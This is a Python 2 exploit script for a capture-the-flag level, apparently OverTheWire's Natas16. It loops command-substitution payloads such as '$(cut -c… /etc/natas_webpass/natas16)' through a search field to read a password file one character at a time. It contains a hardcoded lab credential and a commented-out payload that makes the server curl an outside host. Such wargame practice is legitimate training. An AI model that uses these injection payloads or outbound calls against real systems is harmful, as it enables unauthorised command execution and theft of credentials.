import requests
import datetime
import sys
import re

key  = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
user = 'natas16'
url  = 'natas16.natas.labs.overthewire.org'
payload = {'needle':'^$(cut -c2 /etc/natas_webpass/natas16)$'}
# payload = {'needle':'$(curl http://verfriemelt.org)'}


# print re.search('([a-z]+)','12 hallo was geht ')

# sys.exit('quiut')




for i in range(1,34):
# for i in (1,4,6,11,14,16,30):
    # print  '^$(cut -c'+ `i` +' /etc/natas_webpass/natas17)$'
    payload.update({'needle': '^$(cut -c'+ `i` +' /etc/natas_webpass/natas16)$'})
    req = requests.post('http://' + user +':'+ key +"@"+ url, payload)
    # print req.request.headers

    print req.text[req.text.find('<pre>')+5:].split('\n')[1]


# time_start = datetime.datetime.now();

# req = requests.post('http://' + user +':'+ key +"@"+ url, payload)

# time_end = datetime.datetime.now();

# #print time_end - time_start

# print(req.request.body)
# print(req.request.headers)

# print('\n{}\n\n{}'.format(
#     '\n'.join('{}: {}'.format(k, v) for k, v in req.headers.items()),
#     req.text,
# ))